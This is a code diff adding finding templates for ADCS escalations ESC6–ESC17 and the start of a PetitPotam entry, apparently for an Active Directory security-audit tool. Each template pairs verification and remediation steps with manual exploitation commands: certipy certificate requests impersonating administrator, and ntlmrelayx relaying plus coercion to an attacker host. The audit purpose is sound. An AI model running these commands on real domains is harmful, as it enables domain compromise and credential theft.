+            "# Enumerate ADCS; ESC6 is a CA-level flag reported by the tool:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Request a cert from an auth template, injecting a privileged SAN, "
+            "then authenticate:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template} -upn administrator@<domain>\n"
+            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set in its policy "
+            "EditFlags (run on the CA server or against it):\n"
+            "certutil -config '<ca_host>\\<ca_name>' -getreg "
+            "policy\\EditFlags |\n"
+            "  Select-String -Pattern 'EDITF_ATTRIBUTESUBJECTALTNAME2'\n"
+            "# The presence of that flag means any authenticated enrollee can "
+            "supply an arbitrary SAN."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; the CA EDITF flag is reported in the CA "
+            "section (no certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
+        ),
+        "remediation": (
+            "Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA and restart "
+            "the certificate service: run certutil -config '<ca_host>\\<ca_name>' "
+            "-setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2, then "
+            "Restart-Service certsvc.",
+            "Confirm the flag is cleared afterward with certutil -getreg "
+            "policy\\EditFlags and validate that new requests can no longer supply "
+            "an arbitrary SAN.",
+            "Enforce strong certificate mapping on domain controllers as part of "
+            "the KB5014754 rollout so a mis-mapped certificate is rejected even if "
+            "one is issued.",
+            "Review certificates already issued while the flag was active and "
+            "revoke any that carry an unexpected subject alternative name.",
+        ),
+    },
+    "adcsesc7": {
+        "short": (
+            "ADCS ESC7: {source} holds CA management rights (ManageCA / "
+            "ManageCertificates) over the Enterprise CA {target}, letting it "
+            "reconfigure the CA or approve its own request to obtain a privileged "
+            "certificate."
+        ),
+        "long": (
+            "ADCS ESC7 covers a principal with CA administrative rights on the "
+            "Enterprise CA object. {source_type} {source} holds ManageCA and/or "
+            "ManageCertificates over {target}. With ManageCA the attacker can "
+            "change CA policy — for example enabling EDITF_ATTRIBUTESUBJECTALTNAME2 "
+            "(turning the whole CA into ESC6) or re-adding a vulnerable template. "
+            "With ManageCertificates (certificate manager / officer) the attacker "
+            "can approve a request that was left pending, so it can submit a "
+            "request for a privileged identity on an approval-gated template and "
+            "then approve it itself. Either path yields an authentication "
+            "certificate for a privileged account and compromises the domain."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the CA-rights finding:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# With ManageCA, enable the SAN policy flag (ESC7->ESC6), request a "
+            "cert supplying a privileged SAN, then revert:\n"
+            "certipy ca -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -enable-template SubCA\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template SubCA -upn administrator@<domain>"
+        ),
+        "verify_windows": (
+            "List the CA security permissions and confirm a non-Tier-0 principal "
+            "holds Manage CA or Issue and Manage Certificates:\n"
+            "certutil -config '<ca_host>\\<ca_name>' -getreg CA\\Security |\n"
+            "  Select-String -Pattern 'Allow'\n"
+            "# In the CA console (certsrv.msc) these map to the 'Manage CA' and "
+            "'Issue and Manage Certificates' rights on the CA Security tab."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; the CA rights are reported in the CA "
+            "permissions section (no change made):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
+        ),
+        "remediation": (
+            "Remove Manage CA and Issue and Manage Certificates rights from every "
+            "non-Tier-0 principal on {target} — set them from the CA Security tab "
+            "in certsrv.msc (or certutil -setreg CA\\Security) so only PKI "
+            "administrators retain them.",
+            "Separate the certificate-manager (officer) role from ordinary users "
+            "and restrict it to a dedicated, monitored group.",
+            "Review the CA policy flags (certutil -getreg policy\\EditFlags) for "
+            "any change an attacker with ManageCA could have made, in particular "
+            "EDITF_ATTRIBUTESUBJECTALTNAME2, and revert it.",
+            "Enable CA audit logging (certutil -setreg CA\\AuditFilter 127; "
+            "Restart-Service certsvc) so future CA-configuration and "
+            "request-approval events are recorded.",
+        ),
+    },
+    "adcsesc8": {
+        "short": (
+            "ADCS ESC8: the CA exposes an HTTP web-enrollment endpoint, so a "
+            "coerced machine's authentication can be relayed to it to obtain a "
+            "certificate for that machine — including a domain controller."
+        ),
+        "long": (
+            "ADCS ESC8 abuses the CA's HTTP web-enrollment interface "
+            "(certsrv / the certificate enrollment web service), which by default "
+            "accepts NTLM authentication with no channel binding. Any principal "
+            "who can capture or coerce a victim's NTLM authentication — commonly a "
+            "domain controller coerced via a printer-bug / EFSRPC trigger — relays "
+            "that authentication to the web-enrollment endpoint and requests a "
+            "client authentication certificate as the victim. A certificate for a "
+            "domain controller's machine account can then be used to authenticate "
+            "and replicate the directory, so ESC8 escalates straight to domain "
+            "compromise of {target}. The relay only requires the victim to hold "
+            "any valid domain credential, which makes it cross-forest capable."
+        ),
+        "manual": (
+            "# Confirm the CA web-enrollment endpoint is present and relay-able:\n"
+            "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# 1) Stand up a relay to the CA web-enrollment endpoint requesting a "
+            "DC template:\n"
+            "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
+            "--adcs --template DomainController\n"
+            "# 2) Coerce the DC to authenticate to the relay, then PKINIT with the "
+            "issued cert:\n"
+            "coercer coerce -u <user> -p <pass> -t <dc_ip> -l <attacker_ip>\n"
+            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Check whether the CA offers HTTP web enrollment (the ESC8 relay "
+            "surface). Confirm the Certificate Enrollment web role is installed "
+            "and whether it is bound to HTTP:\n"
+            "Get-WindowsFeature ADCS-Web-Enrollment, ADCS-Enroll-Web-Svc\n"
+            "Get-WebBinding | Where-Object { $_.protocol -eq 'http' }\n"
+            "# Confirm Extended Protection for Authentication (channel binding) is "
+            "enforced on any HTTPS enrollment site so a relay is defeated."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration reports the web-enrollment endpoint under "
+            "the CA (no relay performed):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
+        ),
+        "remediation": (
+            "Disable HTTP web enrollment where it is not required (remove the "
+            "Certificate Enrollment Web role, or restrict it to HTTPS only) so "
+            "there is no unsigned NTLM endpoint to relay to.",
+            "Enable Extended Protection for Authentication (channel binding) and "
+            "require HTTPS on the enrollment web site so relayed NTLM "
+            "authentication is rejected.",
+            "Enforce SMB signing and, where possible, disable NTLM in favour of "
+            "Kerberos so the coercion-to-relay chain has no authentication to "
+            "capture.",
+            "Reduce which accounts can be coerced by hardening the coercion "
+            "triggers (Print Spooler, EFSRPC, DFS) on domain controllers and "
+            "servers.",
+        ),
+    },
+    "adcsesc9": {
+        "short": (
+            "ADCS ESC9: certificate template {template} carries the "
+            "CT_FLAG_NO_SECURITY_EXTENSION flag, so a certificate {source} enrolls "
+            "omits the SID binding and can be mapped to a privileged account."
+        ),
+        "long": (
+            "ADCS ESC9 abuses a certificate template whose "
+            "msPKI-Enrollment-Flag includes CT_FLAG_NO_SECURITY_EXTENSION, which "
+            "tells the CA NOT to embed the szOID_NTDS_CA_SECURITY_EXT SID security "
+            "extension in the issued certificate. Without that extension the domain "
+            "controller falls back to weak, name-based certificate-to-account "
+            "mapping. {source_type} {source}, holding enrollment rights on the "
+            "client authentication template {template} with no manager approval, "
+            "can (typically after altering a controllable account's UPN, or "
+            "combined with a shadow-credential / password-reset primitive) enroll "
+            "a certificate that a DC then maps to a privileged victim, "
+            "authenticating as them and compromising {target}."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the NO_SECURITY_EXTENSION template:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# With control of a victim UPN, enroll and authenticate as the victim:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {template} sets CT_FLAG_NO_SECURITY_EXTENSION (0x80000 in "
+            "msPKI-Enrollment-Flag) and grants client authentication:\n"
+            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
+            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
+            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\" "
+            "-Properties msPKI-Enrollment-Flag, pKIExtendedKeyUsage |\n"
+            "  Format-List cn, msPKI-Enrollment-Flag, pKIExtendedKeyUsage\n"
+            "# Confirm StrongCertificateBindingEnforcement is enforced on DCs "
+            "(KB5014754):\n"
+            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc' "
+            "-Name StrongCertificateBindingEnforcement"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} is flagged ESC9 (no "
+            "certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Clear the CT_FLAG_NO_SECURITY_EXTENSION flag on {template} so issued "
+            "certificates carry the szOID_NTDS_CA_SECURITY_EXT SID extension and "
+            "bind strongly to the enrolling account.",
+            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
+            "domain controllers per KB5014754 so a certificate without the SID "
+            "extension is rejected for authentication.",
+            "Restrict enrollment on {template} and remove it from broad groups so "
+            "a low-privileged principal cannot request it.",
+            "Protect the write paths that let an attacker change a victim's UPN or "
+            "add a key credential (the pairing ESC9 depends on) by auditing "
+            "GenericWrite / GenericAll on user objects.",
+        ),
+    },
+    "adcsesc10": {
+        "short": (
+            "ADCS ESC10: a domain controller uses weak certificate mapping, so a "
+            "certificate {source} enrolls from template {template} can be mapped "
+            "to a privileged account via its UPN."
+        ),
+        "long": (
+            "ADCS ESC10 abuses weak certificate-to-account mapping configured on "
+            "domain controllers — either the UPN mapping registry value "
+            "(CertificateMappingMethods including the UPN bit) or "
+            "StrongCertificateBindingEnforcement left below Full. When mapping is "
+            "weak, a DC authenticates a certificate by matching a name field "
+            "instead of the strong SID binding. {source_type} {source}, able to "
+            "enroll in the client authentication template {template} and to control "
+            "or set a victim's userPrincipalName (or set it to a privileged "
+            "account's UPN), obtains a certificate the DC then maps to that "
+            "victim — authenticating as them and compromising {target}. ESC10 is "
+            "the DC-side mapping analogue of ESC9's template-side flag."
+        ),
+        "manual": (
+            "# Enumerate ADCS and DC mapping configuration:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# After setting the victim UPN, enroll and authenticate as the victim:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm the DC uses weak certificate mapping — the UPN mapping method "
+            "is enabled and strong binding is not enforced:\n"
+            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc' "
+            "-Name StrongCertificateBindingEnforcement\n"
+            "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\"
+            "SecurityProviders\\SCHANNEL' -Name CertificateMappingMethods\n"
+            "# StrongCertificateBindingEnforcement should be 2 (Full); "
+            "CertificateMappingMethods should not enable weak UPN/email mapping."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration reports the DC mapping weakness (nothing "
+            "changed):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
+            "all domain controllers per KB5014754 so certificate authentication "
+            "requires the strong SID binding.",
+            "Remove weak mapping methods from the SCHANNEL CertificateMappingMethods "
+            "registry value so a certificate cannot be mapped by UPN or email "
+            "alone.",
+            "Restrict who can modify userPrincipalName on user objects (audit "
+            "GenericWrite / GenericAll) so an attacker cannot point a victim UPN at "
+            "a privileged account.",
+            "Restrict enrollment on {template} to authorized identities and require "
+            "manager approval where feasible.",
+        ),
+    },
+    "adcsesc11": {
+        "short": (
+            "ADCS ESC11: the CA's ICertPassage RPC interface does not enforce "
+            "packet encryption, so a coerced machine's authentication can be "
+            "relayed to it to obtain a certificate as that machine."
+        ),
+        "long": (
+            "ADCS ESC11 is the RPC-interface counterpart of ESC8. The CA exposes "
+            "the ICertPassage Remote Protocol (MS-ICPR) over RPC, and when the CA "
+            "does not require IF_ENFORCEENCRYPTICERTREQUEST (packet privacy), a "
+            "requester's authentication can be relayed to the RPC endpoint to enrol "
+            "a certificate on the victim's behalf. As with ESC8, coercing a "
+            "domain controller's authentication and relaying it to the CA yields a "
+            "certificate for the DC machine account, which then authenticates and "
+            "replicates the directory — full domain compromise of {target}. The "
+            "relay only needs any valid domain credential, so it is cross-forest "
+            "capable."
+        ),
+        "manual": (
+            "# Confirm the CA RPC endpoint accepts unencrypted requests (ESC11):\n"
+            "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Relay coerced authentication to the CA RPC (ICPR) endpoint:\n"
+            "ntlmrelayx.py -t rpc://<ca_host> -rpc-mode ICPR -icpr-ca-name "
+            "<ca_name> -smb2support\n"
+            "coercer coerce -u <user> -p <pass> -t <dc_ip> -l <attacker_ip>\n"
+            "certipy auth -pfx dc.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm the CA enforces RPC encryption for enrollment requests — the "
+            "IF_ENFORCEENCRYPTICERTREQUEST interface flag should be set:\n"
+            "certutil -config '<ca_host>\\<ca_name>' -getreg CA\\InterfaceFlags |\n"
+            "  Select-String -Pattern 'ENFORCEENCRYPTICERTREQUEST'\n"
+            "# If the flag is absent, the ICPR endpoint accepts relayed, "
+            "unencrypted requests."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration reports the ICPR encryption state under "
+            "the CA (no relay performed):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
+        ),
+        "remediation": (
+            "Enable RPC request encryption on the CA: set the "
+            "IF_ENFORCEENCRYPTICERTREQUEST interface flag (certutil -setreg "
+            "CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST) and restart the "
+            "certificate service so relayed unencrypted requests are rejected.",
+            "Enforce SMB signing and prefer Kerberos over NTLM so the coercion-to-"
+            "relay chain has no authentication to capture.",
+            "Harden the coercion triggers (Print Spooler, EFSRPC, DFS) on domain "
+            "controllers so a machine account cannot be forced to authenticate to "
+            "an attacker.",
+            "Monitor the CA for certificate requests originating from unexpected "
+            "hosts, particularly certificates issued to machine accounts.",
+        ),
+    },
+    "adcsesc13": {
+        "short": (
+            "ADCS ESC13: certificate template {template} has an issuance-policy OID "
+            "linked to a group, so a certificate {source} enrolls yields a logon "
+            "ticket whose PAC carries that group's privileges."
+        ),
+        "long": (
+            "ADCS ESC13 abuses an issuance policy that is linked to an Active "
+            "Directory group through the msDS-OIDToGroupLink attribute. When a "
+            "certificate template carries such an issuance-policy OID, a "
+            "certificate issued from it makes the authenticating account a member "
+            "of the linked group for the duration of that logon — the group SID is "
+            "injected into the Kerberos PAC even though the account is not a real "
+            "member. {source_type} {source}, holding enrollment rights on "
+            "{template} with no manager approval, enrolls and authenticates via "
+            "PKINIT to obtain a TGT whose PAC carries the linked group's SID. If "
+            "that group is privileged, the attacker gains its rights and can reach "
+            "{target}. The elevation lives only in that ticket, so it must be used "
+            "directly rather than re-authenticating with the account's password."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the OID-to-group link on the template:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Enroll from the ESC13 template, then PKINIT to get a TGT carrying "
+            "the linked group SID:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx {source}.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Find issuance-policy OIDs that are linked to a group, then confirm "
+            "{template} references one:\n"
+            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
+            "Get-ADObject -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,"
+            "$cfg\" -LDAPFilter '(msDS-OIDToGroupLink=*)' -Properties "
+            "msPKI-Cert-Template-OID, msDS-OIDToGroupLink |\n"
+            "  Format-List cn, msPKI-Cert-Template-OID, msDS-OIDToGroupLink\n"
+            "# Then confirm {template}'s msPKI-Certificate-Policy references that OID."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm the OID-to-group linkage on "
+            "{template} (no certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Remove the msDS-OIDToGroupLink value from the issuance-policy OID "
+            "object unless the group-membership-via-certificate behaviour is "
+            "deliberately required, and never link an issuance policy to a "
+            "privileged group.",
+            "Restrict enrollment on {template} to authorized identities and require "
+            "manager approval so a low-privileged principal cannot mint the "
+            "group-bearing certificate.",
+            "Audit every issuance policy for a group link (Get-ADObject over the "
+            "OID container) and treat any link to a Tier-0 group as a critical "
+            "finding.",
+            "Enable ADCS issuance auditing (Event IDs 4886 / 4887) so enrollment "
+            "in the affected template is logged.",
+        ),
+    },
+    "adcsesc14": {
+        "short": (
+            "ADCS ESC14: certificate template {template} relies on weak SAN-based "
+            "mapping (altSecurityIdentities), so a certificate {source} enrolls can "
+            "be mapped to a privileged account."
+        ),
+        "long": (
+            "ADCS ESC14 abuses weak explicit certificate mapping via the "
+            "altSecurityIdentities attribute together with a template that requires "
+            "a SAN-based (UPN or email) subject. When a victim account has a weak "
+            "altSecurityIdentities mapping — or when an attacker who can write that "
+            "attribute adds one pointing at a certificate it can obtain — a "
+            "certificate is mapped to that account without the strong SID binding. "
+            "{source_type} {source}, able to enroll in {template} (which requires "
+            "SAN-based mapping, has no manager approval, and is enrollable by a "
+            "non-Tier-0 principal), obtains a certificate that a domain controller "
+            "then maps to a privileged victim, authenticating as them and reaching "
+            "{target}."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the SAN-mapping template + weak "
+            "altSecurityIdentities:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Where the victim has (or can be given) a weak altSecurityIdentities "
+            "mapping, enroll and authenticate as the victim:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "List accounts carrying a weak altSecurityIdentities mapping and "
+            "confirm {template} requires SAN-based subject mapping:\n"
+            "Get-ADObject -LDAPFilter '(altSecurityIdentities=*)' -Properties "
+            "altSecurityIdentities |\n"
+            "  Format-List Name, altSecurityIdentities\n"
+            "# Weak forms (subject-only, issuer-subject, email) are exploitable; "
+            "only X509:<SKI> or the SID extension are strong."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} is flagged ESC14 (no "
+            "certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Replace weak altSecurityIdentities mappings with a strong form "
+            "(X509:<SKI> or the issuer+serial pairing) and remove subject-only, "
+            "issuer-subject, or email-based mappings from every account.",
+            "Enforce StrongCertificateBindingEnforcement = 2 on domain controllers "
+            "per KB5014754 so weak explicit mappings are rejected.",
+            "Restrict write access to the altSecurityIdentities attribute (audit "
+            "GenericWrite / WriteProperty on user objects) so an attacker cannot "
+            "add a self-serving mapping.",
+            "Restrict enrollment on {template} and require manager approval where "
+            "feasible.",
+        ),
+    },
+    "adcsesc15": {
+        "short": (
+            "ADCS ESC15 (EKUwu): schema V1 template {template} lets {source} supply "
+            "the subject AND inject application policies, so it can request a "
+            "certificate usable for client authentication and impersonate any user."
+        ),
+        "long": (
+            "ADCS ESC15 (also called EKUwu, CVE-2024-49019) abuses a schema "
+            "version 1 certificate template that allows the enrollee to supply the "
+            "subject (ENROLLEE_SUPPLIES_SUBJECT). On a V1 template the requester "
+            "can additionally inject arbitrary application policies into the "
+            "request. {source_type} {source}, holding enrollment rights on "
+            "{template} with no manager approval, requests a certificate supplying "
+            "both a privileged subject and a Client Authentication application "
+            "policy — even if the template's own EKU would not normally allow "
+            "authentication. The resulting certificate authenticates as the "
+            "privileged victim via PKINIT (or as a server for a Schannel path), "
+            "compromising {target}."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the V1 enrollee-supplies-subject template:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Request a cert injecting a client-auth application policy and a "
+            "privileged subject, then authenticate:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template} -upn administrator@<domain> "
+            "-application-policies 'Client Authentication'\n"
+            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {template} is schema version 1 and allows the enrollee to "
+            "supply the subject:\n"
+            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
+            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
+            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\" "
+            "-Properties msPKI-Template-Schema-Version, msPKI-Certificate-Name-Flag |\n"
+            "  Format-List cn, msPKI-Template-Schema-Version, "
+            "msPKI-Certificate-Name-Flag\n"
+            "# Schema-Version 1 plus the ENROLLEE_SUPPLIES_SUBJECT bit (0x1) is the "
+            "EKUwu condition."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} is flagged ESC15 (no "
+            "certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Apply Microsoft's CVE-2024-49019 update on the CA so the CA ignores "
+            "attacker-supplied application policies in requests.",
+            "Migrate {template} away from schema version 1 to a version 2 or 3 "
+            "template, or disable the enrollee-supplies-subject flag so the subject "
+            "cannot be attacker-controlled.",
+            "Restrict enrollment on {template} to authorized identities and require "
+            "manager approval where feasible.",
+            "Enforce strong certificate mapping on domain controllers per "
+            "KB5014754 so a mis-issued certificate cannot be mapped to a privileged "
+            "account.",
+        ),
+    },
+    "adcsesc16": {
+        "short": (
+            "ADCS ESC16: the CA omits the SID security extension from every "
+            "certificate it issues, so a certificate {source} obtains can be mapped "
+            "to a privileged account through weak name-based mapping."
+        ),
+        "long": (
+            "ADCS ESC16 is a CA-wide weakness: the certification authority is "
+            "configured to leave the szOID_NTDS_CA_SECURITY_EXT SID security "
+            "extension out of every certificate it issues (the extension OID "
+            "1.3.6.1.4.1.311.25.2 is present in the CA's DisableExtensionList). "
+            "Without that extension a domain controller cannot bind a certificate "
+            "to an account by SID and falls back to weaker name-based mapping — for "
+            "the whole CA, not a single template. {source_type} {source} can then "
+            "obtain a certificate (from any enrollable authentication template) "
+            "and, combined with a controllable name attribute or weak DC mapping, "
+            "have it mapped to a privileged victim, authenticating as them and "
+            "compromising {target}. ESC16 is ESC9 raised from template scope to "
+            "CA scope."
+        ),
+        "manual": (
+            "# Enumerate ADCS; ESC16 is reported as a CA-wide missing SID "
+            "extension:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# With a controllable/weak-mapped victim, enroll and authenticate as "
+            "them:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "certipy auth -pfx <victim>.pfx -dc-ip <dc_ip>"
+        ),
+        "verify_windows": (
+            "Confirm the CA suppresses the SID security extension — the OID "
+            "1.3.6.1.4.1.311.25.2 present in DisableExtensionList disables it (run "
+            "against the CA):\n"
+            "certutil -config '<ca_host>\\<ca_name>' -getreg "
+            "CA\\DisableExtensionList |\n"
+            "  Select-String -Pattern '1.3.6.1.4.1.311.25.2'\n"
+            "# A match means every issued certificate lacks the strong SID binding."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration reports the CA-wide missing SID extension "
+            "(no certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
+        ),
+        "remediation": (
+            "Re-enable the SID security extension on the CA by removing the OID "
+            "1.3.6.1.4.1.311.25.2 from the disable list (certutil -setreg "
+            "CA\\DisableExtensionList -1.3.6.1.4.1.311.25.2) and restart the "
+            "certificate service so new certificates carry strong SID binding.",
+            "Set StrongCertificateBindingEnforcement to 2 (Full enforcement) on "
+            "domain controllers per KB5014754 while certificates are reissued.",
+            "Reissue certificates that were issued while the extension was "
+            "suppressed, since they cannot be mapped strongly.",
+            "Confirm the fix with certutil -getreg CA\\DisableExtensionList and by "
+            "dumping a newly issued certificate to verify the SID extension is "
+            "present.",
+        ),
+    },
+    "adcsesc17": {
+        "short": (
+            "ADCS ESC17: {source} can obtain a Server Authentication certificate "
+            "from template {template} and use it to impersonate a trusted service, "
+            "stand up a rogue TLS endpoint, or support a relay chain."
+        ),
+        "long": (
+            "ADCS ESC17 covers certificate templates that let an attacker mint a "
+            "Server Authentication-capable certificate in a way that enables "
+            "downstream impersonation, relay, or TLS abuse. In practice the "
+            "template combines dangerous enrollment rights with subject control, so "
+            "{source_type} {source} can request a certificate that clients trust "
+            "for server identity. That certificate can then be used to impersonate "
+            "infrastructure clients authenticate to, to stand up a rogue TLS or "
+            "LDAPS endpoint for an adversary-in-the-middle position, or to support "
+            "relay chains — capturing or replaying authentication material and "
+            "pivoting toward {target}. Unlike the client-auth ESCs this is a "
+            "server-identity abuse, so its impact is machine impersonation and "
+            "credential interception rather than direct PKINIT logon."
+        ),
+        "manual": (
+            "# Enumerate ADCS and confirm the server-auth template is enrollable:\n"
+            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-vulnerable -stdout\n"
+            "# Request a server-auth cert for a target service identity:\n"
+            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
+            "-ca <ca_name> -template {template}\n"
+            "# The issued cert is then used to impersonate the service / stand up a "
+            "rogue TLS endpoint (out-of-band)."
+        ),
+        "verify_windows": (
+            "Confirm {template} grants Server Authentication and is enrollable by a "
+            "non-Tier-0 principal with subject control:\n"
+            "certutil -v -template {template} |\n"
+            "  Select-String -Pattern 'Server Authentication', "
+            "'1.3.6.1.5.5.7.3.1', 'ENROLLEE_SUPPLIES_SUBJECT', "
+            "'msPKI-Enrollment-Flag'\n"
+            "# Then review the template enrollment ACL for over-broad rights."
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration; confirm {template} exposes a server-auth "
+            "enrollment surface (no certificate requested):\n"
+            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-vulnerable -stdout\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
+        ),
+        "remediation": (
+            "Restrict enrollment on Server Authentication templates such as "
+            "{template} to the specific service accounts and administrators that "
+            "must request them; remove enrollment rights from broad groups.",
+            "Disable the enrollee-supplies-subject flag on server-auth templates "
+            "where it is not strictly required so the subject cannot be "
+            "attacker-controlled.",
+            "Require CA manager approval on server-auth templates so a certificate "
+            "is never issued automatically to an ordinary principal.",
+            "Enforce LDAP channel binding and SMB signing, and prefer Kerberos "
+            "over NTLM, so a rogue server-auth certificate cannot be leveraged into "
+            "a relay or interception position.",
+        ),
+    },
+    "petitpotam": {
+        "short": (
+            "PetitPotam: {source} can force {target} to authenticate to an "
+            "attacker-chosen host over MS-EFSRPC, capturing or relaying the "
+            "victim machine's credentials."
+        ),
+        "long": (
+            "PetitPotam abuses the Encrypting File System Remote Protocol "
+            "(MS-EFSRPC). Its EfsRpcOpenFileRaw and related methods take a file "
+            "path, and when that path points at an attacker-controlled UNC "
+            "(\\\\attacker\\share\\file), the targeted machine {target} connects "
+            "back and authenticates as its own machine account. {source_type} "
